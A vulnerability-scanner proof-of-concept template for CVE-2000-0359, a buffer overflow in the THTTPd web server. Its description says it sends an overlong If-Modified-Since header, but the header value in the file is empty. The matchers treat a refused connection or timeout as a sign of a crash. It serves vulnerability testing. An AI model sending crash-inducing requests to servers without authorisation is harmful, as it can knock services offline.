[info]
author = "AVE"
description = "向 THTTPd 发送超长 If-Modified-Since 请求头触发缓冲区溢出，验证服务是否存在漏洞"
id = "POC-AVE-2000-0909"
name = "CVE-2000-0359 PoC"
severity = "critical"
tags = ["cve-2000-0359"]
vuln_id = [
    "CVE-2000-0359",
    "AVE-2000-0909",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/"
protocol = "http"

[poc.requests.headers]
If-Modified-Since = ""

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "Connection refused",
    "No route to host",
    "refused",
    "timeout",
]
